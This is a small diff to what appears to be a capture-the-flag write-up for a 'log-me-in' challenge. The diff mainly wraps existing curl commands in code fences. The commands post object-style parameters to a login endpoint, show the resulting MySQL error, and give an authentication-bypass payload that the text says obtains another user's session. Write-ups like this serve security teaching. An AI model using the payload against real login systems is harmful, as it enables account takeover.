@@ -22,7 +22,7 @@ curl -v http://localhost:3000/login -d 'username=michelle&password[age]=13'
 #-d tells what data we will post to the server
 ```
 We are presented with the following error:
-```
+```bash
 code: 'ER_BAD_FIELD_ERROR',
 errno: 1054,
 sqlMessage: "Unknown column 'age' in 'where clause'",
@@ -44,7 +44,9 @@ Select * from users where username = 'michelle' and password = `password` = '1'
 ```
 The above sql statement can be generated from the following payload:
 
+```bash
 curl -v http://localhost:3000/login -d 'username=michelle&password[password]=1' 
+```
 
 Replacing the local address with log-me-in website, we can obtain michelle's session:
 
